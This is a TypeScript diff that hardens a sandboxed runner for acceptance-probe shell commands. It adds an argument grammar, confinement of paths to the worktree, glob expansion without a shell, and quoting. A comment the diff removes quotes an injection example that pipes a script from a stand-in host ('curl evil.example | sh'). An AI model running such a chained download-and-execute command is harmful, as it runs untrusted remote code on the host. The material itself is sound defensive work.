@@ -1,6 +1,9 @@
 import { exec } from "node:child_process";
+import fs from "node:fs";
+import path from "node:path";
 import { promisify } from "node:util";
 import type { RunSandboxContext } from "./sandbox/context";
+import { guardPath, realpathBestEffort } from "./sandbox/pathGuard";
 import { runSandboxedCommand } from "./sandbox/srt";
 import { errorMessage } from "@/shared/errorMessage";
 
@@ -39,12 +42,10 @@ const PROBE_OUTPUT_CHARS = 800;
  * outside this list is reported as not probed rather than quietly treated as
  * passing.
  *
- * The first word is only half the guard — see SHELL_METACHARACTER.
+ * The first word is only the first guard. Each supported command has a strict
+ * argument grammar below, and every path is confined to the worktree.
  */
-const PROBE_ALLOWED = new Set([
-  "cat", "cmp", "command", "diff", "file", "find", "grep", "head", "jq", "ls",
-  "rg", "sed", "stat", "tail", "test", "wc", "which",
-]);
+const PROBE_ALLOWED = new Set(["find", "grep", "rg", "tail", "test"]);
 
 /** Backticked spans in the criteria document. */
 const BACKTICK_SPAN = /`([^`\n]+)`/g;
@@ -54,13 +55,9 @@ const BACKTICK_SPAN = /`([^`\n]+)`/g;
  * command separators and lists (`;`, `&`, `|`), substitution (`$`), a
  * subshell (`(`, `)`), and redirection (`<`, `>`).
  *
- * The allowlist above vouches for a span's FIRST word only, and the span then
- * goes to a shell whole — so `grep -q x file; curl evil.example | sh` passed
- * the allowlist and ran in full, which is precisely what an allowlist is
- * supposed to make impossible. Backticks and newlines cannot appear in a span
- * by construction (BACKTICK_SPAN). Glob characters are deliberately NOT here:
- * they expand to names in the worktree and nothing else, and real criteria use
- * them (`find bin -name 'wrap_*'`).
+ * Backticks and newlines cannot appear in a span by construction. Glob
+ * characters are allowed because safe path operands expand under the
+ * worktree before the shell sees them.
  */
 const SHELL_METACHARACTER = /[;&|$<>()]/;
 
@@ -141,6 +138,176 @@ export type ProbeCommand = {
   expectFailure: boolean;
 };
 
+type ParsedProbeCommand = {
+  executable: string;
+  args: string[];
+  pathIndexes: number[];
+  globPathIndexes: number[];
+};
+
+/** Split one command line without invoking a shell. */
+function shellWords(command: string): string[] | null {
+  const words: string[] = [];
+  let word = "";
+  let quote: "'" | '"' | null = null;
+  let escaped = false;
+  let started = false;
+  for (const char of command) {
+    if (escaped) {
+      word += char;
+      escaped = false;
+      started = true;
+    } else if (char === "\\" && quote !== "'") {
+      escaped = true;
+      started = true;
+    } else if (quote) {
+      if (char === quote) quote = null;
+      else word += char;
+      started = true;
+    } else if (char === "'" || char === '"') {
+      quote = char;
+      started = true;
+    } else if (/\s/.test(char)) {
+      if (started) words.push(word);
+      word = "";
+      started = false;
+    } else {
+      word += char;
+      started = true;
+    }
+  }
+  if (quote || escaped) return null;
+  if (started) words.push(word);
+  return words;
+}
+
+const GREP_FLAGS = /^-[EFGHILPRhilnoqrsvwxz]+$/;
+const RG_FLAGS = /^-[FHILNPUhilnqsvwxyz]+$/;
+
+/** Accept only read-only forms whose path operands can be identified exactly. */
+function parseProbeCommand(command: string): ParsedProbeCommand | null {
+  if (SHELL_METACHARACTER.test(command)) return null;
+  const words = shellWords(command);
+  if (!words || words.length < 2 || !PROBE_ALLOWED.has(words[0])) return null;
+  const [executable, ...args] = words;
+
+  if (executable === "test") {
+    const offset = args[0] === "!" ? 1 : 0;
+    if (args.length !== offset + 2 || !/^-[efdLrsx]$/.test(args[offset])) return null;
+    return { executable, args, pathIndexes: [offset + 1], globPathIndexes: [] };
+  }
+
+  if (executable === "tail") {
+    if (args.length === 2 && args[0] === "-f") {
+      return { executable, args, pathIndexes: [1], globPathIndexes: [] };
+    }
+    if (args.length === 3 && args[0] === "-n" && /^\d+$/.test(args[1])) {
+      return { executable, args, pathIndexes: [2], globPathIndexes: [] };
+    }
+    return null;
+  }
+
+  if (executable === "grep" || executable === "rg") {
+    const flagPattern = executable === "grep" ? GREP_FLAGS : RG_FLAGS;
+    let index = 0;
+    while (index < args.length && flagPattern.test(args[index])) index++;
+    if (index > args.length - 2 || args[index].startsWith("-")) return null;
+    const pathIndexes = args.slice(index + 1).map((_, i) => index + 1 + i);
+    if (pathIndexes.some((i) => args[i].startsWith("-"))) return null;
+    return { executable, args, pathIndexes, globPathIndexes: pathIndexes };
+  }
+
+  if (executable === "find") {
+    let index = 0;
+    const pathIndexes: number[] = [];
+    while (index < args.length && !args[index].startsWith("-") && args[index] !== "!") {
+      pathIndexes.push(index++);
+    }
+    if (pathIndexes.length === 0) return null;
+    while (index < args.length) {
+      const token = args[index++];
+      if (
+        [
+          "-empty",
+          "-readable",
+          "-executable",
+          "-print",
+          "-print0",
+          "!",
+          "-not",
+          "-a",
+          "-and",
+          "-o",
+          "-or",
+        ].includes(token)
+      ) {
+        continue;
+      }
+      const value = args[index++];
+      if (value === undefined) return null;
+      if (
+        (token === "-type" && /^[fdl]$/.test(value)) ||
+        ((token === "-maxdepth" || token === "-mindepth") && /^\d+$/.test(value)) ||
+        token === "-name" ||
+        token === "-iname"
+      ) {
+        continue;
+      }
+      return null;
+    }
+    return { executable, args, pathIndexes, globPathIndexes: [] };
+  }
+
+  return null;
+}
+
+function shellQuote(value: string): string {
+  return `'${value.replaceAll("'", `'"'"'`)}'`;
+}
+
+/** Expand a wildcard in one basename without handing it to a shell. */
+function expandPathGlob(value: string, root: string): string[] | null {
+  const directory = path.dirname(value);
+  const basename = path.basename(value);
+  if (/[*?]/.test(directory) || basename.includes("[")) return null;
+  const canonicalDirectory = guardPath(directory, [root], root);
+  const entries = fs.readdirSync(canonicalDirectory);
+  if (entries.length > 2_000) return null;
+  const expression = new RegExp(
+    `^${basename.replace(/[.+^${}()|[\]\\]/g, "\\$&").replaceAll("*", ".*").replaceAll("?", ".")}$`,
+  );
+  return entries
+    .filter((entry) => expression.test(entry) && (basename.startsWith(".") || !entry.startsWith(".")))
+    .map((entry) => guardPath(path.join(directory, entry), [root], root));
+}
+
+/** Canonicalize every path and expand globs before building a quoted command. */
+function prepareProbeCommand(command: string, cwd: string): string | null {
+  const parsed = parseProbeCommand(command);
+  if (!parsed) return null;
+  const root = realpathBestEffort(cwd);
+  const args = [...parsed.args];
+  for (const index of [...parsed.pathIndexes].sort((a, b) => b - a)) {
+    const value = args[index];
+    guardPath(value, [root], root);
+    if (
+      parsed.globPathIndexes.includes(index) &&
+      (value.includes("*") || value.includes("?") || value.includes("["))
+    ) {
+      const safeMatches = expandPathGlob(value, root);
+      if (!safeMatches) return null;
+      args.splice(
+        index,
+        1,
+        ...(safeMatches.length > 0 ? safeMatches : [guardPath(value, [root], root)]),
+      );
+    } else {
+      args[index] = guardPath(value, [root], root);
+    }
+  }
+  return [parsed.executable, ...args].map(shellQuote).join(" ");
+}
+
 export type ProbeResult = {
   command: string;
   expectFailure: boolean;
@@ -165,9 +332,7 @@ export function probeCommands(acceptanceCriteria: string): ProbeCommand[] {
   const found = new Map<string, ProbeCommand>();
   for (const match of acceptanceCriteria.matchAll(BACKTICK_SPAN)) {
     const command = match[1].trim();
-    if (SHELL_METACHARACTER.test(command)) continue;
-    const [head, ...rest] = command.split(/\s+/);
-    if (rest.length === 0 || !PROBE_ALLOWED.has(head) || found.has(command)) continue;
+    if (!parseProbeCommand(command) || found.has(command)) continue;
     const after = acceptanceCriteria.slice(match.index + match[0].length);
     found.set(command, { command, expectFailure: EXPECT_FAILURE.test(after) });
   }
@@ -190,11 +355,18 @@ export async function runAcceptanceProbe(opts: {
   const { ctx } = opts;
   const results: ProbeResult[] = [];
   for (const { command, expectFailure } of probeCommands(opts.acceptanceCriteria)) {
+    let prepared: string;
+    try {
+      prepared = prepareProbeCommand(command, opts.worktreePath) ?? "";
+    } catch {
+      continue;
+    }
+    if (!prepared) continue;
     // The prefix is newline-separated lines ending in `|| true`, with no
     // trailing separator of its own. Concatenating the command straight onto
     // it makes it the right-hand side of that `||`, which never runs — the
     // probe then reads every check as passing. Join explicitly.
-    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${command}` : command;
+    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${prepared}` : prepared;
     // `runOne` reports its own failures, so the only thing that escapes here
     // is a wrap that could not be built. Then do not run it at all: reported
     // as unprobed, never as a failure, because the criterion is not disproven
@@ -355,7 +527,18 @@ export async function precheckAcceptance(opts: {
     // `|| true`, and a command appended to it becomes that `||`'s right-hand
     // side and never runs — which here would read every check as already
     // passing and send the plan off for a revision it does not need.
-    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${command}` : command;
+    let prepared: string;
+    try {
+      prepared = prepareProbeCommand(command, opts.worktreePath) ?? "";
+    } catch {
+      report.unprobed.push(command);
+      continue;
+    }
+    if (!prepared) {
+      report.unprobed.push(command);
+      continue;
+    }
+    const prefixed = ctx.commandPrefix ? `${ctx.commandPrefix}\n${prepared}` : prepared;
     try {
       const { ran, exitZero } = ctx.srtConfig
         ? await runSandboxedCommand(
